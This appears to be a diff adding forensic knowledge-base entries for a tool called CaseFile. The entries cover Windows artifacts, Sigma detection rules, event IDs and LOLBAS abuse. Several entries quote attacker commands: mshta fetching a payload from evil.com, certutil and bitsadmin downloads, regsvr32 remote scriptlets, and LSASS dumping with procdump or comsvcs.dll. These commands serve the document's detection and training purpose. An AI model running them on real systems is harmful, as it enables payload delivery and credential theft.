+  {"id": "ATT-T1560", "source": "mitre_attack", "technique_id": "T1560", "title": "Archive Collected Data", "content": "Adversaries may compress and/or encrypt data that is collected prior to exfiltration. Tools: 7-Zip, WinRAR, zip.exe, compress-archive (PowerShell). Detection: Prefetch shows 7z.exe, rar.exe, zip.exe execution. MFT shows creation of archive files (.zip, .7z, .rar) in staging directories. Volume of archive creation (many files → one archive) before network activity indicates staging.", "tags": ["collection", "archive", "windows", "T1560"]},
+  {"id": "ATT-T1105", "source": "mitre_attack", "technique_id": "T1105", "title": "Ingress Tool Transfer", "content": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools: certutil (download cradle), bitsadmin, PowerShell Invoke-WebRequest, curl, wget. Detection: certutil.exe in Prefetch is a strong indicator (rarely used legitimately for downloads). Amcache shows new binaries first seen at unusual times. MFT creation timestamps of tools in Temp/Downloads.", "tags": ["command_and_control", "tool_transfer", "windows", "T1105", "certutil"]},
+  {"id": "GUIDE-PREFETCH", "source": "artifact_guide", "title": "Prefetch Analysis Guide", "content": "Windows Prefetch files (.pf) record application execution. Location: C:\\Windows\\Prefetch. Format: filename + hash of path + .pf (e.g., MALWARE.EXE-AB1234CD.pf). Contents: last run time, run count (up to 8 previous times in Win8+), files/directories accessed during first 10 seconds. Key investigative value: Proves execution occurred even if binary deleted. Run count shows how many times executed. Access times show resources loaded. CaseFile tool: parse_prefetch(). Limitations: Disabled on SSDs by default before Win8, max 128/1024 entries. Always check if service is enabled (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher).", "tags": ["prefetch", "execution", "artifact_guide", "windows"]},
+  {"id": "GUIDE-AMCACHE", "source": "artifact_guide", "title": "Amcache Analysis Guide", "content": "Amcache.hve records program execution and installation metadata. Location: C:\\Windows\\AppCompat\\Programs\\Amcache.hve. Contents: SHA1 hash of executable at time of first execution, full path, file size, compilation timestamp, publisher. Key investigative value: SHA1 allows hash lookups (VirusTotal). First execution timestamp. Detects renamed executables (hash doesn't change). Survives binary deletion. CaseFile tool: parse_amcache(). Requires LOG1/LOG2 transaction log files alongside hive. Gotcha: Amcache records installation events, not every execution -- use Prefetch for execution count.", "tags": ["amcache", "execution", "artifact_guide", "windows", "sha1"]},
+  {"id": "GUIDE-MFT", "source": "artifact_guide", "title": "MFT Analysis Guide", "content": "The Master File Table ($MFT) is the primary index of all files on an NTFS volume. Location: C:\\$MFT (hidden system file). Contents: Every file/directory has an MFT entry with: creation, modification, access, MFT change times in both $STANDARD_INFORMATION and $FILE_NAME attributes, parent path, filename, file size, allocated size. Key investigative value: Timestomping detection (SI < FN indicates manipulation), file creation timeline, deleted file entries (allocation bit 0), alternate data streams. CaseFile tool: parse_mft(). SI<FN flag in CaseFile output indicates timestomping. Always check both Created0x10 (SI) and Created0x30 (FN) columns.", "tags": ["mft", "ntfs", "timestomping", "artifact_guide", "windows", "SI_FN"]},
+  {"id": "GUIDE-REGISTRY", "source": "artifact_guide", "title": "Registry Analysis Guide", "content": "Windows Registry stores system and user configuration. Key forensic hives: SYSTEM (services, mounted devices, timezone, last shutdown), SOFTWARE (installed programs, run keys, OS version), SECURITY (LSA secrets, cached credentials), SAM (local accounts), NTUSER.DAT (per-user settings, MRU lists, typed URLs, UserAssist), UsrClass.dat (shellbags). Key investigative value: Persistence mechanisms (Run keys, services), evidence of tool usage (MRU lists), user activity (UserAssist, shellbags), system configuration. CaseFile tool: parse_registry(). LastWrite timestamps indicate when key was modified. RECmd produces CSV with all parsed key/value pairs.", "tags": ["registry", "persistence", "artifact_guide", "windows"]},
+  {"id": "GUIDE-EVENTLOGS", "source": "artifact_guide", "title": "Event Log Analysis Guide", "content": "Windows Event Logs (.evtx) record security and system events. Key logs: Security (authentication, privilege use, object access), System (service changes, driver load, shutdown), Application (application errors). Critical Event IDs: 4624/4625/4634 (logon/fail/logoff), 4648 (explicit credentials), 4672 (special privileges), 4688 (process creation with command line if audited), 4698/4699 (scheduled task create/delete), 4720/4726 (user create/delete), 4732/4733 (group add/remove), 7045 (service install), 1102/104 (log cleared). CaseFile tool: parse_event_logs(). Cleared logs create timeline gaps. Correlate with other artifacts for cross-source confirmation.", "tags": ["event_logs", "artifact_guide", "windows", "evtx", "4624", "4648", "7045"]},
+  {"id": "GUIDE-MEMORY", "source": "artifact_guide", "title": "Memory Analysis Guide", "content": "Memory images capture volatile state at acquisition time. Volatility 3 plugins used in CaseFile: pslist (running processes from EPROCESS linked list), psscan (processes from pool tag scanning, finds hidden), netscan (network connections and sockets), cmdline (command line arguments per process), dlllist (loaded DLLs per process), handles (open handles per process), malfind (suspicious executable memory regions). Key investigative value: Living processes and their network connections, hidden/injected processes, command lines of malicious processes, DLLs loaded by processes. Caveat: EPROCESS ImageFileName truncated to 14 chars -- use startswith + len==14 check. Volatility outputs JSON per plugin; CaseFile correlates across pslist, psscan, netscan.", "tags": ["memory", "volatility", "artifact_guide", "windows", "volatility3"]},
+  {"id": "GUIDE-SHELLBAGS", "source": "artifact_guide", "title": "Shellbags Analysis Guide", "content": "Shellbags record Windows Explorer folder access, persisting even after folder deletion. Location: NTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\BagMRU and Bags, UsrClass.dat\\Local Settings\\Software\\Microsoft\\Windows\\Shell. Contents: Folder names, paths, timestamps of last interaction. Key investigative value: Proves user browsed specific folders (attacker reconnaissance), shows deleted directory structure, reveals network share access (\\\\server\\share patterns), USB device folder access. Tool: SBECmd.exe (EZ Tools). Artifacts persist after folder deletion -- attacker can delete files but shellbags remain.", "tags": ["shellbags", "user_activity", "artifact_guide", "windows", "explorer"]},
+  {"id": "GUIDE-LNKFILES", "source": "artifact_guide", "title": "LNK File Analysis Guide", "content": "Windows shortcut files (.lnk) are created automatically when files are opened. Location: C:\\Users\\%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Recent. Contents: Target file path, MAC times of target at link creation, volume serial number, NetBIOS name, MAC address of source computer. Key investigative value: Proves file access even if file deleted, reveals USB device usage (volume serial number), shows network share access, source machine identification via MAC address. Tool: LECmd.exe (EZ Tools).", "tags": ["lnk", "user_activity", "artifact_guide", "windows", "recent_files"]},
+  {"id": "GUIDE-JUMPLIST", "source": "artifact_guide", "title": "Jump List Analysis Guide", "content": "Jump Lists track recently/frequently used files per application. Location: C:\\Users\\%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations. Format: AppID.automaticDestinations-ms (per application). Contents: File paths, access times, volume serial numbers, AppID identifying the application. Key investigative value: Shows which files were opened by which application, persists after file deletion, reveals document access patterns, USB device usage. Tool: JLECmd.exe (EZ Tools). AppID list maps hex IDs to application names.", "tags": ["jumplist", "user_activity", "artifact_guide", "windows", "recent_files"]},
+  {"id": "GUIDE-USERASSIST", "source": "artifact_guide", "title": "UserAssist Analysis Guide", "content": "UserAssist records GUI program execution via Windows Explorer. Location: NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist. Contents: ROT13-encoded program paths, run count, last execution timestamp, focus time. Key investigative value: Proves GUI execution of programs (complements Prefetch which captures all execution), focus time indicates interactive use, session count shows frequency. Decoded via RECmd UserAssist plugin.", "tags": ["userassist", "execution", "artifact_guide", "windows", "gui_execution"]},
+  {"id": "GUIDE-BROWSERHISTORY", "source": "artifact_guide", "title": "Browser Forensics Guide", "content": "Browser artifacts reveal web activity and potential download sources. Chrome/Edge: History (SQLite), Cache, Downloads, Cookies at %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default. Firefox: places.sqlite (history), downloads.sqlite at %APPDATA%\\Mozilla\\Firefox\\Profiles. Key investigative value: Download history (source URL + save path), visited sites at specific times, credential storage, session data. Correlate download timestamps with Prefetch execution times and MFT file creation times.", "tags": ["browser", "user_activity", "artifact_guide", "windows", "chrome", "firefox"]},
+  {"id": "GUIDE-USBFORENSICS", "source": "artifact_guide", "title": "USB Device Forensics Guide", "content": "USB connection artifacts span multiple locations. Registry: HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR (device details, first/last connection), HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USB (USB class). Event Logs: System log Event ID 20001 (device installed), Security log 4663 (object access). SetupAPI log: C:\\Windows\\inf\\setupapi.dev.log (first install timestamp). LNK files and shellbags reveal files accessed from USB. Volume serial number in LNK files links to specific device.", "tags": ["usb", "device_forensics", "artifact_guide", "windows"]},
+  {"id": "SIGMA-SERVICE-INSTALL", "source": "sigma", "title": "Sigma: Suspicious Service Installation", "content": "Sigma rule for suspicious Windows service installation. Detection: Event ID 7045 where ServiceFileName contains patterns: %TEMP%, %APPDATA%, C:\\Users\\, .exe from writable user paths, or ServiceName matches known malware patterns. False positives: legitimate software installers, admin tools. Response: investigate binary at ServiceFileName path, check Amcache for SHA1, correlate with logon events to identify installing account.", "tags": ["sigma", "service_install", "detection", "windows", "7045"]},
+  {"id": "SIGMA-LATERAL-MOVEMENT", "source": "sigma", "title": "Sigma: Lateral Movement via SMB", "content": "Sigma rule for lateral movement detection. Detection: Event ID 4624 logon type 3 (network) where LogonProcessName=NtLmSsp AND AuthenticationPackageName=NTLM AND TargetUserName != 'ANONYMOUS LOGON' AND WorkstationName != ComputerName (source != destination). High confidence when same account authenticates to 3+ hosts within 30 minutes. NTLM to domain-joined host via IP (not hostname) indicates pass-the-hash.", "tags": ["sigma", "lateral_movement", "detection", "windows", "4624", "ntlm"]},
+  {"id": "SIGMA-LOG-CLEARING", "source": "sigma", "title": "Sigma: Event Log Clearing", "content": "Sigma rule for event log clearing. Detection: Event ID 1102 (Security audit log cleared) OR Event ID 104 (System/Application log cleared) in Security or System channel. Any occurrence is high confidence -- legitimate admins rarely clear logs without prior notice. Correlate with Prefetch wevtutil.exe entries, and check who was logged on at that time via Event ID 4624.", "tags": ["sigma", "log_clearing", "anti_forensics", "detection", "windows", "1102", "104"]},
+  {"id": "SIGMA-MASQUERADING", "source": "sigma", "title": "Sigma: Process Masquerading", "content": "Sigma rule for process masquerading detection. Detection: Process name matches known Windows processes (svchost.exe, csrss.exe, lsass.exe, winlogon.exe, services.exe) but ImagePath does NOT match expected location (System32, SysWOW64). Also detect: multiple instances of processes that should be unique (lsass.exe, winlogon.exe without session context), wrong parent process (csrss.exe parent != smss.exe).", "tags": ["sigma", "masquerading", "detection", "windows", "T1036"]},
+  {"id": "SIGMA-PROCDUMP", "source": "sigma", "title": "Sigma: LSASS Credential Dumping via ProcDump", "content": "Sigma rule for procdump-based credential dumping. Detection: Process creation event where Image contains procdump OR CommandLine contains lsass. High confidence: procdump.exe with -ma flag targeting lsass.exe (procdump -ma lsass.exe). Also detect: rundll32.exe comsvcs.dll MiniDump, Task Manager creating LSASS.DMP in unusual paths. Correlate with Event ID 4656 (handle to LSASS with access rights including PROCESS_VM_READ).", "tags": ["sigma", "credential_dumping", "lsass", "detection", "windows", "procdump", "T1003.001"]},
+  {"id": "SIGMA-POWERSHELL-DOWNLOAD", "source": "sigma", "title": "Sigma: PowerShell Download Cradle", "content": "Sigma rule for PowerShell download cradle detection. Detection: PowerShell process with CommandLine containing: (DownloadString OR DownloadFile OR WebClient OR Invoke-WebRequest OR IEX OR Invoke-Expression) AND (http:// OR https://). Also detect encoded commands (-enc, -EncodedCommand) with Base64 content decoding to download functions. Event ID 4104 (script block logging) captures the decoded content.", "tags": ["sigma", "powershell", "download", "detection", "windows", "T1059.001"]},
+  {"id": "SIGMA-COBALT-STRIKE", "source": "sigma", "title": "Sigma: Cobalt Strike Indicators", "content": "Sigma rules for Cobalt Strike detection. Network: Regular beacon intervals (60s, 120s, 300s), HTTP GET/POST to non-standard paths (/s/ref=, /favicon.ico, /api/), JA3/JA3S fingerprints matching known CS profiles. Host: Named pipes (\\PIPE\\msagent_, \\PIPE\\status_), hex-named executable payloads, parent process spoofing (ppid mismatch in process list vs actual parent), process injection from unusual parent. Memory: Malfind on beacon process, unsigned executable memory regions.", "tags": ["sigma", "cobalt_strike", "c2", "detection", "windows", "beacon"]},
+  {"id": "SIGMA-TIMESTOMPING", "source": "sigma", "title": "Sigma: Timestomping Detection", "content": "Sigma rule for timestomping detection using MFT analysis. Detection: MFT entry where $STANDARD_INFORMATION created/modified timestamps are OLDER than $FILE_NAME timestamps (SI<FN condition). High confidence when difference > 1 hour. Also detect: timestamps rounded to exact seconds (0 milliseconds) on recently created files, timestamps matching common system file dates (2009-2012) on recently compiled binaries. CaseFile MFT output includes SI<FN flag column.", "tags": ["sigma", "timestomping", "anti_forensics", "detection", "windows", "mft", "T1070.006"]},
+  {"id": "SIGMA-WMIC", "source": "sigma", "title": "Sigma: WMIC for Lateral Movement", "content": "Sigma rule for WMIC-based lateral movement. Detection: wmic.exe process with /node: parameter (remote execution), wmic.exe spawning cmd.exe or powershell.exe on remote host. Event ID 4688 with CommandLine containing 'wmic /node'. Also detect: WMI subscriptions for persistence (Event ID 5861 - WMI activity, filter/consumer binding). WMI lateral movement leaves fewer event log traces than PsExec.", "tags": ["sigma", "wmic", "lateral_movement", "detection", "windows"]},
+  {"id": "SIGMA-KERBEROASTING", "source": "sigma", "title": "Sigma: Kerberoasting Attack", "content": "Sigma rule for Kerberoasting detection. Detection: Event ID 4769 (Kerberos service ticket request) where TicketOptions=0x40810000 AND TicketEncryptionType=0x17 (RC4, weak encryption preferred by attack tools). High confidence: multiple 4769 events from single source in short timeframe requesting tickets for different SPNs. Tool indicators: Rubeus, Invoke-Kerberoast in PowerShell script block logs.", "tags": ["sigma", "kerberoasting", "credential_access", "detection", "windows", "4769", "kerberos"]},
+  {"id": "METHOD-TIMELINE", "source": "methodology", "title": "Timeline Reconstruction Methodology", "content": "Effective forensic timeline reconstruction uses multiple artifact sources. Step 1: Extract timestamps from all sources (MFT, Prefetch last run times, Amcache first execution, Event Log timestamps, Registry LastWrite times). Step 2: Normalize to UTC. Step 3: Correlate events within 5-minute windows to identify activity clusters. Step 4: Identify gaps (evidence of log clearing, anti-forensics). Step 5: Anchor to known events (initial access, lateral movement, exfiltration). CaseFile: record_timeline_event() for each significant timestamp, then correlate_evidence() to cross-reference across sources.", "tags": ["methodology", "timeline", "forensics", "windows"]},
+  {"id": "METHOD-CORRELATION", "source": "methodology", "title": "Cross-Source Evidence Correlation", "content": "Correlation across artifact sources increases confidence from INFERRED to CONFIRMED. Four primary sources in CaseFile: Amcache (installation/first execution), Prefetch (execution with count/timing), MFT (file system presence with timestamps), Memory (runtime state). Correlation pattern: process_name appears in all 4 sources = CONFIRMED_RUNNING. Missing memory but in 3 disk sources = CONFIRMED_HISTORICAL. Only Amcache = INSTALLED_NEVER_RAN. Contradictions between sources are themselves findings (e.g., process in memory but not on disk = possible process hollowing).", "tags": ["methodology", "correlation", "forensics", "windows", "evidence"]},
+  {"id": "METHOD-IOCS", "source": "methodology", "title": "IOC Extraction and Propagation", "content": "Indicators of Compromise extracted from one host should be hunted on all related hosts. IOC categories: IP addresses (C2 servers, lateral movement targets), hostnames (internal infrastructure), executable names and hashes (malware, tools), file paths (staging directories). IOC propagation workflow: 1) Extract IOCs from CONFIRMED findings on source host, 2) Write to iocs.md in target case directory, 3) Run investigation on target host with IOC awareness, 4) Correlate hits to establish multi-host compromise scope.", "tags": ["methodology", "ioc", "forensics", "windows", "hunting"]},
+  {"id": "METHOD-ANTIFORENSICS", "source": "methodology", "title": "Anti-Forensics Detection", "content": "Anti-forensics actions are themselves forensic evidence. Common anti-forensics and their artifacts: Log clearing (Event IDs 1102/104, timeline gap, wevtutil in Prefetch), Secure deletion (sdelete in Prefetch/Amcache, MFT $BITMAP gaps), Timestomping (SI<FN in MFT), Binary deletion (Prefetch proves execution of deleted binary), Volume shadow copy deletion (vssadmin in Prefetch, Event ID 524), CCleaner usage (Prefetch shows CCleaner.exe). Anti-forensics actions require time -- their timing reveals the attacker's cleanup window.", "tags": ["methodology", "anti_forensics", "detection", "windows"]},
+  {"id": "METHOD-PERSISTENCE-HUNTING", "source": "methodology", "title": "Persistence Mechanism Hunting", "content": "Systematic persistence hunting covers: Services (SYSTEM\\CurrentControlSet\\Services), Run keys (SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run[Once]), Scheduled tasks (C:\\Windows\\System32\\Tasks + Event 4698), WMI subscriptions (Event 5861), DLL hijacking (application directories with writable DLLs), COM hijacking (HKCU COM registry), AppInit DLLs (SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs), Image File Execution Options (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options). CaseFile: parse_registry() covers Run keys and services.", "tags": ["methodology", "persistence", "hunting", "windows"]},
+  {"id": "WIN-PROCESSES", "source": "windows_baseline", "title": "Windows Normal Process Baseline", "content": "Expected Windows processes and their normal characteristics: System (PID 4, no parent, kernel). smss.exe (parent: System, 1 instance, runs from System32\\smss.exe). csrss.exe (parent: smss.exe, multiple instances one per session, runs from System32\\csrss.exe). winlogon.exe (parent: smss.exe, one per interactive session). services.exe (parent: wininit.exe, 1 instance, System32). lsass.exe (parent: wininit.exe, 1 instance, System32). svchost.exe (parent: services.exe, multiple OK, always System32\\svchost.exe -k [group]). explorer.exe (parent: userinit.exe, one per user session, Windows\\explorer.exe).", "tags": ["windows_baseline", "processes", "detection", "windows"]},
+  {"id": "WIN-SERVICES", "source": "windows_baseline", "title": "Windows Suspicious Service Indicators", "content": "Suspicious Windows service indicators: ServiceFileName in user-writable paths (Temp, AppData, Users), services with random character names (5-8 random alphanumeric), services running as SYSTEM with unusual binaries, duplicate service display names with different service names, services with no description, services where binary SHA1 is not in NIST NSRL (known-good). Legitimate services: signed by Microsoft or known vendors, in System32 or Program Files, have proper version info and company strings in binary metadata.", "tags": ["windows_baseline", "services", "detection", "windows"]},
+  {"id": "WIN-NETWORK", "source": "windows_baseline", "title": "Windows Network Baseline", "content": "Normal Windows network connections: System process (PID 4) - SMB (445), DNS (53). svchost.exe - Windows Update (443 to Microsoft IPs), DHCP (67/68), NTP (123). lsass.exe - Kerberos (88, 464), LDAP (389, 636). Suspicious: any process connecting to raw IPs on port 445, connections to non-Microsoft IPs from system processes, regular interval connections (beacon pattern), explorer.exe or Word.exe with outbound connections, SYSTEM-context processes connecting to external IPs.", "tags": ["windows_baseline", "network", "detection", "windows"]},
+  {"id": "WIN-LOLBAS-CERTUTIL", "source": "lolbas", "title": "LOLBAS: certutil.exe", "content": "certutil.exe is a legitimate Windows certificate utility frequently abused for malicious purposes. Malicious uses: download files (certutil -urlcache -split -f [URL] [output]), decode Base64 (certutil -decode [input] [output]), encode files (certutil -encode [input] [output]), install certificates (trust injection). Detection: certutil in Prefetch is suspicious when not in IT context, -urlcache or -decode flags in command line (Event 4688 with command line auditing), output files in Temp/user directories. Legitimate use: certificate management by admins.", "tags": ["lolbas", "certutil", "download", "detection", "windows", "T1105"]},
+  {"id": "WIN-LOLBAS-RUNDLL32", "source": "lolbas", "title": "LOLBAS: rundll32.exe", "content": "rundll32.exe executes DLL files and is frequently abused. Malicious uses: execute DLLs from user paths (rundll32 C:\\Temp\\evil.dll,EntryPoint), LSASS dump (rundll32 comsvcs.dll MiniDump [PID] [output] full), execute JavaScript (rundll32 javascript:...), load remote DLLs. Detection: rundll32 with unusual DLL paths, rundll32 with comsvcs.dll and MiniDump argument, rundll32 spawning cmd/powershell, rundll32 making network connections. Parent: unusual parents (Office, browser) spawning rundll32.", "tags": ["lolbas", "rundll32", "detection", "windows", "T1218.011"]},
+  {"id": "WIN-LOLBAS-MSHTA", "source": "lolbas", "title": "LOLBAS: mshta.exe", "content": "mshta.exe executes HTA (HTML Application) files and is abused for execution. Malicious uses: execute remote HTA (mshta http://evil.com/payload.hta), execute inline VBScript (mshta vbscript:...), execute inline JavaScript. Detection: mshta making network connections, mshta spawning cmd/powershell/wscript, mshta in Prefetch when Office applications were recently active, HTA files in temp directories. Legitimate use: enterprise applications using HTA for UI.", "tags": ["lolbas", "mshta", "execution", "detection", "windows", "T1218.005"]},
+  {"id": "WIN-LOLBAS-REGSVR32", "source": "lolbas", "title": "LOLBAS: regsvr32.exe", "content": "regsvr32.exe registers COM DLLs and is abused for execution (Squiblydoo technique). Malicious uses: execute remote SCT scripts (regsvr32 /s /u /i:[URL] scrobj.dll), load malicious DLLs, bypass AppLocker. Detection: regsvr32 making network connections (should never need network), regsvr32 with /i: parameter pointing to URL or unusual path, regsvr32 spawning unusual child processes. The /s flag suppresses dialogs and /u deregisters -- combination with /i: and URL is high confidence IOC.", "tags": ["lolbas", "regsvr32", "execution", "defense_evasion", "detection", "windows"]},
+  {"id": "WIN-LOLBAS-WSCRIPT", "source": "lolbas", "title": "LOLBAS: wscript.exe / cscript.exe", "content": "wscript.exe (GUI) and cscript.exe (console) execute Windows Script Host scripts (.vbs, .js, .wsf). Malicious uses: execute malicious VBScript/JScript droppers, download and execute payloads, persistence via run keys. Detection: wscript/cscript spawned from email client or Office (phishing indicator), scripts in Temp/Downloads directories, scripts making network connections, unusual parent processes. Event 4688 with script path. Prefetch shows script engine execution.", "tags": ["lolbas", "wscript", "cscript", "execution", "detection", "windows"]},
+  {"id": "WIN-LOLBAS-BITSADMIN", "source": "lolbas", "title": "LOLBAS: bitsadmin.exe", "content": "bitsadmin.exe manages Background Intelligent Transfer Service (BITS) jobs. Malicious uses: download files (bitsadmin /transfer [name] [URL] [dest]), persistence via BITS jobs that survive reboot, execute commands after download completes. Detection: bitsadmin in Prefetch, Event ID 59/60/61 in Microsoft-Windows-Bits-Client log, BITS jobs persisting in C:\\ProgramData\\Microsoft\\Network\\Downloader. BITS jobs run as SYSTEM and bypass some network restrictions.", "tags": ["lolbas", "bitsadmin", "download", "persistence", "detection", "windows"]},
+  {"id": "WIN-EVENTID-4624", "source": "windows_events", "title": "Event ID 4624: Successful Logon", "content": "Event ID 4624 records successful account logon. Key fields: LogonType (2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 10=RemoteInteractive/RDP, 11=CachedInteractive), SubjectUserName (who initiated), TargetUserName (who logged on), WorkstationName (source), IpAddress (source IP for network logons), LogonProcessName (authentication package), AuthenticationPackageName (NTLM vs Kerberos). Forensic value: RDP (type 10), pass-the-hash (type 3, NTLM auth, IP source), service account interactive logons (type 2 for service accounts).", "tags": ["windows_events", "authentication", "4624", "logon", "windows"]},
+  {"id": "WIN-EVENTID-4688", "source": "windows_events", "title": "Event ID 4688: Process Creation", "content": "Event ID 4688 records process creation (requires Process Tracking audit policy enabled). Key fields: NewProcessName (full path of new process), CommandLine (requires additional audit policy), SubjectUserName (creating user), ParentProcessName (parent process path). Forensic value: Command line arguments reveal attacker tools and techniques, parent-child process relationships reveal injection and spawning patterns, timestamps enable process timeline reconstruction. Enable with: auditpol /set /subcategory:'Process Creation' /success:enable", "tags": ["windows_events", "process_creation", "4688", "command_line", "windows"]},
+  {"id": "WIN-EVENTID-7045", "source": "windows_events", "title": "Event ID 7045: Service Installed", "content": "Event ID 7045 (System log) records new service installation. Key fields: ServiceName, ServiceFileName (binary path), ServiceType (kernel driver, own process, shared process), StartType (automatic, manual, disabled), AccountName (SYSTEM, Network Service, or specific account). Forensic value: New services are a primary persistence mechanism. ServiceFileName in user-writable paths (Temp, AppData, Users\\Public) is high confidence IOC. Correlate with Amcache to get binary SHA1 and first execution time.", "tags": ["windows_events", "service_install", "7045", "persistence", "windows"]},
+  {"id": "WIN-EVENTID-4698", "source": "windows_events", "title": "Event ID 4698: Scheduled Task Created", "content": "Event ID 4698 (Security log) records scheduled task creation. Key fields: TaskName, TaskContent (full XML including trigger, action, and principal). Forensic value: Full task XML reveals exact command executed, trigger (at logon, at startup, daily at specific time), user context (SYSTEM for privilege escalation). Suspicious: tasks with random names, Base64-encoded actions in task XML, tasks running as SYSTEM created by non-admin accounts. Also check: 4702 (task modified), 4699 (task deleted).", "tags": ["windows_events", "scheduled_task", "4698", "persistence", "windows"]},
+  {"id": "WIN-EVENTID-1102", "source": "windows_events", "title": "Event ID 1102: Security Log Cleared", "content": "Event ID 1102 (Security log) records that the Security audit log was cleared. Subject fields identify who cleared the log. Any occurrence is high-confidence anti-forensics indicator. Forensic value: Clearing the Security log creates a timeline gap, the clearing event itself identifies the actor, and the timing correlates with the attacker's cleanup window. Correlate with last events before gap and first events after to bound the attacker's activity window. Also: Event 104 for System/Application log clearing.", "tags": ["windows_events", "log_clearing", "1102", "anti_forensics", "windows"]},
+  {"id": "WIN-EVENTID-4719", "source": "windows_events", "title": "Event ID 4719: Audit Policy Changed", "content": "Event ID 4719 records changes to system audit policy. Key fields: SubcategoryGuid (which audit category changed), AuditPolicyChanges (success/failure enabled or disabled). Forensic value: Attackers disable audit policies to reduce log volume before conducting operations. Disabling Process Creation auditing (removes 4688), Object Access auditing, or clearing all policies via auditpol /clear are anti-forensics actions. The change itself is logged before policy takes effect.", "tags": ["windows_events", "audit_policy", "4719", "anti_forensics", "windows"]},
+  {"id": "WIN-EVENTID-4648", "source": "windows_events", "title": "Event ID 4648: Logon Using Explicit Credentials", "content": "Event ID 4648 records when a process attempts a logon by specifying credentials explicitly (runas, net use with credentials, pass-the-hash tools). Key fields: SubjectUserName (who ran the command), AccountName (credentials used), TargetServerName (target system). Forensic value: Pass-the-hash tools generate 4648 events, lateral movement via runas or psexec generates 4648, credential stuffing against internal resources. Correlate with 4624 type 3 on target system.", "tags": ["windows_events", "explicit_credentials", "4648", "lateral_movement", "windows"]},
+  {"id": "WIN-KERBEROS-4769", "source": "windows_events", "title": "Event ID 4769: Kerberos Service Ticket Requested", "content": "Event ID 4769 on domain controller records Kerberos service ticket requests. Key fields: ServiceName (which SPN requested), TicketEncryptionType (0x17=RC4, 0x12=AES256), TicketOptions. Forensic value: Kerberoasting uses RC4 encryption requests for service accounts (attackers request RC4 because it's faster to crack offline). Multiple 4769 events with EncryptionType=0x17 for different SPNs from single source = Kerberoasting. DCSync generates many 4662 events from one source.", "tags": ["windows_events", "kerberos", "4769", "credential_access", "windows", "kerberoasting"]},
+  {"id": "TOOL-VOLATILITY-PSLIST", "source": "tool_reference", "title": "Volatility3: pslist Plugin", "content": "volatility3 pslist enumerates processes from the Windows EPROCESS doubly-linked list. Output fields: PID, PPID, ImageFileName (truncated to 14 chars), Offset, Threads, Handles, SessionId, Wow64, CreateTime, ExitTime. CaseFile usage: parse_memory() with plugin='pslist'. Key limitation: rootkits can unlink processes from EPROCESS list (use psscan to detect). ImageFileName is truncated -- cannot distinguish 'SearchIndexer.exe' from 'SearchIndexer' (14 chars). Always cross-reference with psscan for hidden process detection.", "tags": ["tool_reference", "volatility", "memory", "pslist", "windows"]},
+  {"id": "TOOL-VOLATILITY-NETSCAN", "source": "tool_reference", "title": "Volatility3: netscan Plugin", "content": "volatility3 netscan finds network connections and sockets from memory pool scanning. Output fields: Offset, Proto (TCPv4/v6, UDPv4/v6), LocalAddr, LocalPort, ForeignAddr, ForeignPort, State (ESTABLISHED/LISTENING/CLOSE_WAIT), PID, Owner (process name), Created. CaseFile usage: parse_memory() with plugin='netscan'. Key forensic value: Captures connections at time of acquisition, reveals C2 connections, shows listening services. Limitation: Only captures active connections at acquisition time -- completed connections not visible.", "tags": ["tool_reference", "volatility", "memory", "netscan", "network", "windows"]},
+  {"id": "TOOL-VOLATILITY-MALFIND", "source": "tool_reference", "title": "Volatility3: malfind Plugin", "content": "volatility3 malfind identifies suspicious executable memory regions not backed by a file on disk. Detection criteria: VAD (Virtual Address Descriptor) with executable flag set AND no corresponding file mapping AND MZ header (4D5A) present in memory region. Output: Process name, PID, memory address, page flags, hexdump of region start. Forensic value: Detects injected shellcode, reflective DLL loading, process hollowing, unpacked malware. High false positive rate (legitimate JIT code); correlate with other indicators.", "tags": ["tool_reference", "volatility", "memory", "malfind", "injection", "windows"]},
+  {"id": "TOOL-EZCMD-MFTECMD", "source": "tool_reference", "title": "EZ Tools: MFTECmd", "content": "MFTECmd.exe parses the NTFS Master File Table. CaseFile command: MFTECmd.exe -f [MFT] --csv [output_dir] --csvf [output.csv]. Output columns include: EntryNumber, SequenceNumber, InUse, ParentPath, FileName, Extension, FileSize, ReferenceCount, ReparseTarget, IsDirectory, HasAds, IsAds, SI_LaFN, uSec, Copied, SiFlags (contains SI<FN flag), NameType, Created0x10 (SI created), Created0x30 (FN created), LastModified0x10, LastModified0x30, LastRecordChange0x10, LastRecordChange0x30, LastAccess0x10, LastAccess0x30, UpdateSequenceNumber, LogFileSequenceNumber, SecurityId, ObjectIdFileDroid. SiFlags column value contains 'SI<FN' when timestomping detected.", "tags": ["tool_reference", "mftecmd", "mft", "ez_tools", "windows"]},
+  {"id": "TOOL-EZCMD-AMCACHEPARSER", "source": "tool_reference", "title": "EZ Tools: AmcacheParser", "content": "AmcacheParser.exe parses Amcache.hve registry hive. CaseFile command: AmcacheParser.exe -f [Amcache.hve] --csv [output_dir]. Requires LOG1/LOG2 transaction log files in same directory as hive. Output files: Amcache_UnassociatedFileEntries.csv (key forensic output), Amcache_ProgramEntries.csv, Amcache_AssociatedFileEntries.csv. Key columns in UnassociatedFileEntries: SHA1, FullPath, FileExtension, ProductName, CompanyName, FileVersion, FileDescription, LastWriteTime, FileSize. SHA1 is hash of first 31.25MB of file content.", "tags": ["tool_reference", "amcacheparser", "amcache", "ez_tools", "windows"]},
